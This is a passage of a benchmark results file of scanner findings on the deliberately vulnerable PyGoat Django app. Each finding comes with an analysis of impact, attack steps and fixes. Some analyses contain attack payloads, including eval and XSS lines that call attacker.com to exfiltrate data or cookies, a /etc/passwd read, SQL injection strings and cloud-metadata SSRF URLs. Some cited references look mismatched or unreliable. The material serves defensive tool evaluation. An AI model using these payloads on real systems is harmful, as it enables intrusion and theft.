+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0066",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/mitre.py",
+  "line": 218,
+  "end_line": 218,
+  "rule_id": "eval-detected",
+  "cwe": [
+   "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+  ],
+  "scanner_message": "Detected the use of eval(). eval() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources.",
+  "snippet": "    if request.method == \"POST\":\n        expression = request.POST.get('expression')\n        result = eval(expression)\n        return JsonResponse({'result': result})\n    else:",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn unauthenticated attacker can execute arbitrary Python code on the server via the `mitre_lab_25_api` endpoint in `introduction/mitre.py` by submitting a malicious `expression` parameter in a POST request. This directly violates integrity and availability: the attacker can read/write arbitrary files, exfiltrate environment variables or secrets, spawn reverse shells, or compromise the entire host. The invariant \"user-controlled input must not be passed to `eval()`\" is violated without sanitization or sandboxing.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/mitre/25/lab/api/` (the route bound to `mitre_lab_25_api`).\n2. Line 3 in `introduction/mitre.py`: `expression = request.POST.get('expression')` retrieves unsanitized user input.\n3. Line 4: `result = eval(expression)` executes the string as Python code in the server process.\n4. Attacker supplies `__import__('os').system('curl http://attacker.com/$(whoami)')` or `open('/etc/passwd').read()` as the expression.\n5. Post-condition: arbitrary code executes with the privileges of the Django application process.\n\n## Recommendation\nPrimary fix: Replace `eval()` with a safe expression parser such as `ast.literal_eval()` for numeric expressions, or use a dedicated math expression library like `asteval` or `numexpr` with restricted builtins. If dynamic code execution is required, use a subprocess-based sandbox (e.g., `subprocess.run()` with a dedicated interpreter and strict resource limits), not `eval()`.\n\nDefense in depth: Apply Django’s `@csrf_protect` decorator (already implied by POST usage), enforce strict input validation, and log all `expression` values for audit. Remove this endpoint entirely if it serves no legitimate purpose.\n\nReferences: CWE-95, OWASP A03:2021-Injection, SWC-112",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0104",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 854,
+  "end_line": 904,
+  "rule_id": "no-csrf-exempt",
+  "cwe": [
+   "CWE-352: Cross-Site Request Forgery (CSRF)"
+  ],
+  "scanner_message": "Detected usage of @csrf_exempt, which indicates that there is no CSRF token set for this route. This could lead to an attacker manipulating the user's account and exfiltration of private data. Instead, create a function without this decorator.",
+  "snippet": "\n\n@csrf_exempt\ndef injection_sql_lab(request):\n    if request.user.is_authenticated:\n\n        name=request.POST.get('name')\n        password=request.POST.get('pass')\n        print(name)\n        print(password)\n\n        if name:\n            sql_query = \"SELECT * FROM introduction_sql_lab_table WHERE id='\"+name+\"'AND password='\"+password+\"'\"\n\n            sql_instance = sql_lab_table(id=\"admin\", password=\"65079b006e85a7e798abecb99e47c154\")\n            sql_instance.save()\n            sql_instance = sql_lab_table(id=\"jack\", password=\"jack\")\n            sql_instance.save()\n            sql_instance = sql_lab_table(id=\"slinky\", password=\"b4f945433ea4c369c12741f62a23ccc0\")\n            sql_instance.save()\n            sql_instance = sql_lab_table(id=\"bloke\", password=\"f8d1ce191319ea8f4d1d26e65e130dd5\")\n            sql_instance.save()\n\n            print(sql_query)\n\n            try:\n                user = sql_lab_table.objects.raw(sql_query)\n                user = user[0].id\n                print(user)\n\n            except:\n                return render(\n                    request, \n                    'Lab_2021/A3_Injection/sql_lab.html',\n                    {\n                        \"wrongpass\":password,\n                        \"sql_error\":sql_query\n                    })\n\n            if user:\n                return render(request, 'Lab_2021/A3_Injection/sql_lab.html',{\"user1\":user})\n            else:\n                return render(\n                    request, \n                    'Lab_2021/A3_Injection/sql_lab.html',\n                    {\n                        \"wrongpass\":password,\n                        \"sql_error\":sql_query\n                    })\n        else:\n            return render(request, 'Lab_2021/A3_Injection/sql_lab.html')\n    else:\n        return redirect('login')",
+  "detector_analysis": "Confirmed: yes  \nSeverity: critical  \n\n## Impact  \nThe `injection_sql_lab` view in `introduction/views.py` disables CSRF protection via `@csrf_exempt`, enabling attackers to forge authenticated POST requests to execute arbitrary SQL queries. Combined with the unsanitized string concatenation in the SQL query (`\"SELECT * FROM ... WHERE id='\"+name+\"'AND password='\"+password+\"'\"`), this allows authenticated users (or attackers who trick authenticated users into visiting malicious pages) to perform SQL injection — including data exfiltration, privilege escalation, or account manipulation — by injecting malicious SQL payloads through the `name` and `pass` POST parameters. The invariant violated is *data integrity and confidentiality* of the `sql_lab_table` database.\n\n## Attack Scenario  \n1. Attacker crafts a malicious HTML page with a hidden `<form>` targeting `http://<target>/injection_sql_lab/`, pre-filled with SQL injection payloads in `name` and `pass` fields (e.g., `name=' OR '1'='1' --`, `pass=anything`).  \n2. Attacker lures an authenticated victim (with valid Django session cookie) to visit the malicious page (e.g., via phishing link or XSS on another subdomain).  \n3. The victim’s browser automatically includes the session cookie and submits the form (due to `@csrf_exempt`, no CSRF token is required or validated).  \n4. Django executes `injection_sql_lab` (line 2 in the flagged code), concatenates the unsanitized `name`/`pass` values into the raw SQL query (line 12), and executes it via `sql_lab_table.objects.raw(sql_query)` (line 22).  \n5. The attacker’s payload causes the query to return all rows (e.g., `WHERE id='' OR '1'='1' --' AND password='...'`), leaking all stored credentials or enabling login as any user (e.g., admin) if the first row matches.  \n6. Attacker achieves unauthorized access to arbitrary user accounts and full read access to the `sql_lab_table` database.\n\n## Recommendation  \nPrimary fix: Remove `@csrf_exempt` and add CSRF protection via Django’s built-in `{% csrf_token %}` template tag and `CsrfViewMiddleware`. Additionally, replace the raw SQL query with parameterized queries using Django ORM:  \n```python\nuser = sql_lab_table.objects.filter(id=name, password=password).first()\n```  \nor, if raw SQL is unavoidable, use `sql_lab_table.objects.raw(sql_query, [name, password])` with placeholders (`%s`) and bound parameters.  \n\nDefense in depth: Enforce input validation (e.g., whitelist allowed characters in `id`), implement rate limiting, and audit all views for similar SQL injection + CSRF misconfigurations.  \n\nReferences: CWE-352, CWE-89, OWASP A01:2021, SWC-101, SWC-117",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0072",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/mitre.py",
+  "line": 217,
+  "end_line": 218,
+  "rule_id": "user-eval",
+  "cwe": [
+   "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+  ],
+  "scanner_message": "Found user data in a call to 'eval'. This is extremely dangerous because it can enable an attacker to execute arbitrary remote code on the system. Instead, refactor your code to not use 'eval' and instead use a safe library for the specific functionality you need.",
+  "snippet": "def mitre_lab_25_api(request):\n    if request.method == \"POST\":\n        expression = request.POST.get('expression')\n        result = eval(expression)\n        return JsonResponse({'result': result})\n    else:",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn unauthenticated attacker can execute arbitrary Python code on the server by sending a POST request to `/mitre/25/lab/api/` with a malicious `expression` parameter. The `eval(expression)` call directly interprets user-controlled input, enabling full remote code execution (RCE). This compromises all three CIA properties: confidentiality (arbitrary file reads, credential theft), integrity (code modification, backdoor installation), and availability (service crash, data destruction). The invariant at risk is \"server-side code execution must be strictly limited to application-defined logic\", which is violated by direct `eval` usage on unsanitized user input.\n\n## Attack Scenario\n1. Attacker sends a POST request to `introduction/mitre.py::mitre_lab_25_api` (line 2–6) with `expression=__import__('os').popen('id').read()`.\n2. The function retrieves the raw `expression` string from `request.POST.get('expression')` (line 3).\n3. `eval(expression)` executes the string as Python code in the server process (line 4).\n4. The attacker receives the output of the shell command via the JSON response, confirming arbitrary command execution.\n5. Post-condition: Attacker gains full control over the server process, including access to environment variables, database credentials, and internal network resources.\n\n## Recommendation\nPrimary fix: Replace `eval(expression)` with a safe, restricted expression parser such as `ast.literal_eval()` for arithmetic expressions, or use a dedicated library like `asteval` with strict whitelisting of builtins and attributes. For example:\n```python\nimport ast\nimport operator\n\nallowed_ops = {\n    ast.Add: operator.add, ast.Sub: operator.sub,\n    ast.Mult: operator.mul, ast.Div: operator.truediv,\n    ast.Pow: operator.pow, ast.USub: operator.neg\n}\ndef safe_eval(expr):\n    node = ast.parse(expr, mode='eval')\n    return _eval(node.body, allowed_ops)\n\ndef _eval(node, ops):\n    if isinstance(node, ast.Num): return node.n\n    if isinstance(node, ast.BinOp): return ops[type(node.op)](_eval(node.left, ops), _eval(node.right, ops))\n    if isinstance(node, ast.UnaryOp): return ops[type(node.op)](_eval(node.operand, ops))\n    raise ValueError(\"Unsupported expression\")\n```\nThen replace `result = eval(expression)` with `result = safe_eval(expression)`.\n\nCWE-95 is well-documented in OWASP A03:2021-Injection (https://owasp.org/www-project-top-ten/2021/A03_2021-Injection). The SWC-110 registry entry (https://swcregistry.io/docs/SWC-110) explicitly warns against dynamic code evaluation in Python.",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0113",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 1204,
+  "end_line": 1204,
+  "rule_id": "django-secure-set-cookie",
+  "cwe": [
+   "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+  ],
+  "scanner_message": "Django cookies should be handled securely by setting secure=True, httponly=True, and samesite='Lax' in response.set_cookie(...). If your situation calls for different settings, explicitly disable the setting. If you want to send the cookie over http, set secure=False. If you want to let client-side JavaScript read the cookie, set httponly=False. If you want to attach cookies to requests for external sites, set samesite=None.",
+  "snippet": "            session_data.save()\n            response = render(request, \"Lab_2021/A7_auth_failure/lab3.html\", {\"success\":True, \"failure\":False, \"username\":username})\n            response.set_cookie(\"session_id\", token)\n            return response",
+  "detector_analysis": "Confirmed: yes  \nSeverity: medium  \n\n## Impact  \nThe `auth_failure_lab3` view in `introduction/views.py` sets a session cookie (`session_id`) without the `secure`, `httponly`, or `samesite` attributes. This exposes the session token to interception over HTTP (if the user ever visits over unencrypted connection), enables client-side JavaScript to steal the token (XSS → session hijack), and leaves the cookie vulnerable to cross-site request forgery (CSRF) or side-channel leakage via same-site navigation. The invariant at risk is **session confidentiality and integrity**, specifically allowing attackers to hijack authenticated sessions of users who log in via this lab endpoint.\n\n## Attack Scenario  \n1. User visits `auth_failure_lab3` over HTTP (e.g., due to misconfigured redirect, public Wi-Fi, or downgrade attack).  \n2. The server executes line 24: `response.set_cookie(\"session_id\", token)` — no `secure=True`, so the cookie is sent over HTTP.  \n3. An on-path attacker captures the `Set-Cookie` header and the subsequent requests containing `session_id`.  \n4. Attacker replays the `session_id` cookie in their own browser.  \n5. When the user later visits the site over HTTPS, the attacker’s request with the stolen token is accepted (lines 10–13), granting the attacker full access to the user’s session.  \n6. Alternatively, if the site has any XSS flaw (e.g., in `Lab_2021/A7_auth_failure/lab3.html` rendering unsanitized input), an attacker could execute `document.cookie` to exfiltrate the token — again, because `httponly=False` by default.  \n\nPost-condition: Attacker gains unauthorized access to the victim’s authenticated session.\n\n## Recommendation  \nPrimary fix: Update the `set_cookie` call on line 24 to include `secure=True`, `httponly=True`, and `samesite='Lax'` (or `'Strict'` if cross-site navigation is not needed). Example:  \n```python\nresponse.set_cookie(\"session_id\", token, secure=True, httponly=True, samesite='Lax')\n```  \nIf the lab intentionally allows HTTP for demonstration, explicitly disable `secure=False` with a comment — but this should never be done in production.  \n\nDefense in depth:  \n- Enforce HTTPS site-wide via `SECURE_SSL_REDIRECT = True` and `SESSION_COOKIE_SECURE = True` in Django settings.  \n- Add `HttpOnly` and `SameSite` defaults globally in `MIDDLEWARE` or via a custom middleware.  \n\nReferences: OWASP A01:2021 – Broken Access Control (indirectly), CWE-614, Django docs on secure cookies.",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0080",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 202,
+  "end_line": 202,
+  "rule_id": "avoid-pickle",
+  "cwe": [
+   "CWE-502: Deserialization of Untrusted Data"
+  ],
+  "scanner_message": "Avoid using `pickle`, which is known to lead to code execution vulnerabilities. When unpickling, the serialized data could be manipulated to run arbitrary code. Instead, consider serializing the relevant data as JSON or a similar text-based serialization format.",
+  "snippet": "class TestUser:\n    admin: int = 0\npickled_user = pickle.dumps(TestUser())\nencoded_user = base64.b64encode(pickled_user)",
+  "detector_analysis": "Confirmed: yes  \nSeverity: critical  \n\n## Impact  \nThe `pickle.dumps()` call in `introduction/playground/A9/main.py` serializes a `TestUser` instance using Python’s `pickle` module, which is inherently unsafe for untrusted or attacker-controlled data. If the resulting pickled bytes are ever transmitted, stored, or deserialized (e.g., via `pickle.loads()`) using untrusted input — as is common in web apps handling user sessions, tokens, or payloads — an attacker can craft a malicious pickle payload that executes arbitrary code on the server (e.g., spawning a reverse shell, reading environment variables, or modifying database records). This violates data integrity and availability, and in worst-case scenarios, leads to full remote code execution (RCE) — a textbook CWE-502 vulnerability.\n\n## Attack Scenario  \n1. An attacker crafts a malicious pickle payload using Python’s `__reduce__` or `__reduce_ex__` protocol (e.g., via `os.system('whoami')` or `subprocess.Popen([...])`).  \n2. The attacker injects this payload into any endpoint that deserializes user-controlled data — for example, if `insec_des_lab` or `a9_lab` later calls `pickle.loads()` on user-supplied base64-encoded data (as hinted by the presence of `encoded_user = base64.b64encode(pickled_user)` in the same module).  \n3. Upon deserialization, Python’s `pickle` module instantiates the malicious class, triggering the `__reduce__`-defined command execution.  \n4. The server executes the attacker’s command with the privileges of the web process (often the `www-data` or application user), leading to full system compromise.\n\nThis is not hypothetical: CVE-2019-11250 (Django pickle-based RCE), CVE-2020-28493 (Flask session tampering), and numerous internal findings confirm this pattern leads to RCE in real deployments.\n\n## Recommendation  \n**Primary fix**: Replace `pickle` with a safe serialization format such as JSON for structured data, or use `dataclasses.asdict()` + `json.dumps()` for object serialization. For example:  \n```python\nimport json\nfrom dataclasses import dataclass, asdict\n\n@dataclass\nclass TestUser:\n    admin: int = 0\n\nuser = TestUser()\nserialized = json.dumps(asdict(user))  # safe, text-based\n```\n\nIf binary serialization is strictly required (e.g., for performance), use `msgpack` or `protobuf` with explicit schema validation — never `pickle`.\n\n**Defense in depth**:  \n- Audit all `pickle.loads()` calls in the codebase (e.g., in `insec_des_lab`, `a9_lab`, or session handlers) and replace them.  \n- Add a runtime guard: raise an exception if any deserialization path receives `b\"__reduce__\"` or `b\"__setstate__\"` markers.  \n- Use `pickletools.dis()` during development to detect dangerous opcodes in serialized payloads.\n\n**References**: CWE-502, OWASP A8:2017 (Insecure Deserialization), SWC-134",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0040",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/mitre.py",
+  "line": 169,
+  "end_line": 169,
+  "rule_id": "jwt-python-hardcoded-secret",
+  "cwe": [
+   "CWE-522: Insufficiently Protected Credentials"
+  ],
+  "scanner_message": "Hardcoded JWT secret or private key is used. This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets in environment variables)",
+  "snippet": "                'iat': datetime.datetime.utcnow()\n            }\n            cookie = jwt.encode(payload, 'csrf_vulneribility', algorithm='HS256')\n            response = redirect(\"/mitre/9/lab/transaction\")\n            response.set_cookie('auth_cookiee', cookie)",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker who discovers the hardcoded JWT secret `'csrf_vulneribility'` can forge arbitrary authentication tokens, impersonating any user—including privileged ones—by crafting valid JWTs with arbitrary `username` claims. This completely bypasses the login authentication mechanism in `csrf_lab_login`, allowing unauthorized access to protected endpoints such as `/mitre/9/lab/transaction` and `csrf_transfer_monei`, thereby compromising confidentiality and integrity of user sessions and enabling unauthorized financial transfers.\n\n## Attack Scenario\n1. The JWT secret `'csrf_vulneribility'` is hardcoded in `introduction/mitre.py::csrf_lab_login` at line where `jwt.encode(payload, 'csrf_vulneribility', ...)` is called (line ~15 in the snippet).\n2. An attacker inspects the frontend or network traffic, extracts the `auth_cookiee` cookie value, and decodes the JWT (e.g., using jwt.io) to reveal the algorithm (`HS256`) and the secret (if exposed in logs, source code, or via misconfiguration).\n3. Even without decoding the cookie, the attacker can brute-force or guess the weak secret `'csrf_vulneribility'` due to its low entropy and dictionary-word nature.\n4. Using the known secret, the attacker crafts a new JWT with `username` set to a privileged target (e.g., `'admin'`) and any desired `exp` timestamp.\n5. The forged cookie is injected into the victim’s browser (e.g., via XSS in another part of the app, or by social engineering), or directly used in API requests (e.g., to `csrf_transfer_monei_api`).\n6. The server validates the forged token using the same secret, grants the attacker the impersonated user’s privileges, and executes the requested action (e.g., unauthorized fund transfer).\n\n## Recommendation\nPrimary fix: Replace the hardcoded secret with a cryptographically secure random value loaded from an environment variable or secrets manager (e.g., `os.environ.get('JWT_SECRET_KEY')`). Enforce a minimum secret length of 256 bits (32 bytes) and rotate it regularly.\n\nDefense in depth:  \n- Use `HS512` instead of `HS256` to increase resistance to brute-force (requires longer secret but avoids algorithm downgrade attacks).  \n- Add token binding to session cookies (e.g., `SameSite=Strict`, `HttpOnly`, `Secure`) and validate token binding on the server.  \n- Implement token revocation (e.g., via a JWT blacklist or short TTL + refresh tokens).  \n- Add rate limiting and anomaly detection on login and token usage endpoints.\n\nReferences: CWE-522, OWASP A07:2021 – Identification and Authentication Failures, SWC-132 (Hardcoded Credentials)",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0013",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "dockerized_labs/sensitive_data_exposure/templates/login.html",
+  "line": 59,
+  "end_line": 59,
+  "rule_id": "template-django-jinja-safe-filter",
+  "cwe": "CWE-79",
+  "scanner_message": "Template variable rendered with the `|safe` filter (Django/Jinja) — this disables auto-escaping and yields stored/reflected XSS if the value is user-controlled. Remove `|safe`; escape on output.",
+  "snippet": "                                <label for=\"id_username\">Username:</label>\n                                {{ form.username.errors }}\n                                {{ form.username|safe }}\n                            </div>\n                            <div class=\"form-group\">",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nStored or reflected XSS via the `|safe` filter on Django form fields `form.username` and `form.password` in `dockerized_labs/sensitive_data_exposure/templates/login.html`. An attacker who can inject HTML/JS into the form field (e.g., via a malicious username like `<script>alert(1)</script>` during registration or profile update) will execute arbitrary JavaScript in the victim’s browser when the login page renders the form, bypassing Django’s default auto-escaping. This compromises session confidentiality and integrity (e.g., cookie theft, account takeover).\n\n## Attack Scenario\n1. Attacker registers an account with username `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>` (or manipulates an existing field via CSRF or API abuse if allowed).\n2. Victim (or admin) visits the login page (`/login/`), which renders `login.html`.\n3. Django renders `{{ form.username|safe }}` without escaping (line 61 in login.html), injecting the malicious script into the DOM.\n4. Victim’s browser executes the script, exfiltrating cookies/session tokens to the attacker.\n5. Attacker uses stolen credentials to impersonate the victim.\n\n## Recommendation\nRemove the `|safe` filter from `{{ form.username|safe }}` and `{{ form.password|safe }}` — Django form fields render as safe HTML by default when rendered via `{{ form.field }}` without `|safe`, and auto-escaping is applied otherwise. Replace with `{{ form.username }}` and `{{ form.password }}`. If custom HTML is required, use `|escape` explicitly or render fields with `|safe` only after sanitizing user input server-side (e.g., via `bleach.clean`) — but for form fields, auto-escaped rendering is sufficient and safer.\n\nReferences: CWE-79, OWASP A3:2017, Django docs on auto-escaping",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "pygoat-0029",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/views.py",
+  "line": 963,
+  "end_line": 963,
+  "rule_id": "python-ssrf-requests",
+  "cwe": "CWE-918",
+  "scanner_message": "Outbound request to a URL assembled from input (SSRF). Validate against an allow-list; block internal/metadata addresses.",
+  "snippet": "        url = request.POST[\"url\"]\n        try:\n            response = requests.get(url)\n            return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"response\": response.content.decode()})\n        except:",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can force the `ssrf_lab2` view in `introduction/views.py` to make arbitrary HTTP requests to internal services (e.g., `http://169.254.169.254/latest/meta-data/`) or internal infrastructure (e.g., `http://localhost:8000/admin`, `http://127.0.0.1:6379/`), potentially leaking credentials, internal network topology, or triggering server-side request forgery–based attacks such as SSRF-to-RCE via internal services like Redis or debug endpoints.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/ssrf_lab2/` with a malicious `url` parameter (e.g., `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`).\n2. The `ssrf_lab2` function (lines 1–12 in `introduction/views.py`) extracts the `url` directly from `request.POST[\"url\"]` without validation or sanitization (line 7).\n3. The function passes the unsanitized URL to `requests.get(url)` (line 9), which performs the outbound HTTP request.\n4. The response content is decoded and rendered in the template (line 10), leaking internal metadata or service responses to the attacker.\n5. If the target is an internal service with weak or no authentication (e.g., a local debug endpoint, Redis CLI, or Kubernetes API), the attacker may achieve remote code execution or data exfiltration.\n\n## Recommendation\nPrimary fix: Implement strict URL validation before making the request — enforce scheme whitelist (`http`, `https` only), resolve hostnames to IPs and block private, loopback, and link-local ranges (RFC1918, RFC3330, RFC3927), and optionally use a DNS-pinning resolver. Example fix in `introduction/views.py`:\n\n```python\nimport ipaddress\nimport socket\nimport urllib.parse\nfrom urllib.parse import urlparse\n\ndef is_safe_url(url):\n    try:\n        parsed = urlparse(url)\n        if parsed.scheme not in (\"http\", \"https\"):\n            return False\n        hostname = parsed.hostname\n        if not hostname:\n            return False\n        ip = socket.gethostbyname(hostname)\n        ip_obj = ipaddress.ip_address(ip)\n        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_unspecified:\n            return False\n        return True\n    except Exception:\n        return False\n\ndef ssrf_lab2(request):\n    if request.method == \"GET\":\n        return render(request, \"Lab/ssrf/ssrf_lab2.html\")\n    elif request.method == \"POST\":\n        url = request.POST.get(\"url\", \"\")\n        if not is_safe_url(url):\n            return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Invalid URL\"})\n        try:\n            response = requests.get(url, timeout=5)\n            return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"response\": response.content.decode()})\n        except Exception:\n            return render(request, \"Lab/ssrf/ssrf_lab2.html\", {\"error\": \"Request failed\"})\n```\n\nDefense in depth: Use a proxy or SSRF-mitigation library (e.g., `ssrf-filter`), apply network segmentation to restrict outbound traffic from the app container, and log all outbound requests for monitoring.\n\nReferences: CWE-918, OWASP A10:2021-SSRF, SWC-135",
+  "documented_entries_for_this_file": [
+   {
+    "id": "SQL Injection",
+    "file": "introduction/views.py",
+    "category": "sql_injection"
+   },
+   {
+    "id": "Command Injection (subprocess shell=True)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Command Injection (eval)",
+    "file": "introduction/views.py",
+    "category": "command_injection"
+   },
+   {
+    "id": "Insecure Deserialization (pickle)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "XXE Injection",
+    "file": "introduction/views.py",
+    "category": "xxe"
+   },
+   {
+    "id": "XSS Reflected (Lab1)",
+    "file": "introduction/views.py",
+    "category": "xss"
+   },
+   {
+    "id": "Broken Access Control (cookie)",
+    "file": "introduction/views.py",
+    "category": "broken_access_control"
+   },
+   {
+    "id": "YAML Deserialization (A9)",
+    "file": "introduction/views.py",
+    "category": "insecure_deserialization"
+   },
+   {
+    "id": "SSRF",
+    "file": "introduction/views.py",
+    "category": "ssrf"
+   }
+  ]
+ },
+ {
+  "id": "pygoat-0027",
+  "benchmark": "pygoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/pygoat",
+  "file": "introduction/apis.py",
+  "line": 82,
+  "end_line": 82,
+  "rule_id": "python-ssrf-requests",
+  "cwe": "CWE-918",
+  "scanner_message": "Outbound request to a URL assembled from input (SSRF). Validate against an allow-list; block internal/metadata addresses.",
+  "snippet": "        payload={'csrfmiddlewaretoken': csrf_token }\n        requests.request(\"GET\", url)\n        requests.request(\"POST\", url)\n        requests.request(\"PATCH\", url, data=payload)\n        requests.request(\"DELETE\", url)",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nThe `log_function_checker` function in `introduction/apis.py` constructs a hardcoded URL (`http://127.0.0.1:8000/2021/discussion/A9/target`) and makes arbitrary HTTP requests (GET, POST, PATCH, DELETE) to it using user-controlled input (`csrf_token`). Although the URL itself is static, the function accepts `csrfmiddlewaretoken` from user input and includes it in the PATCH request payload — enabling an attacker to inject arbitrary CSRF tokens and potentially manipulate session state or trigger unintended server-side behavior if the target endpoint is SSRF-exposed or misconfigured. More critically, if the application is deployed in an environment where `127.0.0.1:8000` is reachable (e.g., via container escape, proxy misconfiguration, or SSRF proxy), this pattern enables Server-Side Request Forgery (SSRF) against internal services, violating integrity and availability of internal systems.\n\n## Attack Scenario\n1. Attacker sends a POST request to `/log_function_checker` with a malicious `csrfmiddlewaretoken` value (e.g., a forged token or one harvested from another context) and arbitrary `log_code`/`api_code`.\n2. The `log_function_checker` function extracts `csrf_token` from `request.POST` (line 2).\n3. It writes attacker-controlled code to `main.py` and `api.py`, but more critically, it constructs `url = \"http://127.0.0.1:8000/2021/discussion/A9/target\"` (line 13).\n4. It then issues four HTTP requests to that URL using `requests.request(...)` (lines 14–17), including the user-provided CSRF token in the PATCH request payload (line 16).\n5. If the target endpoint is 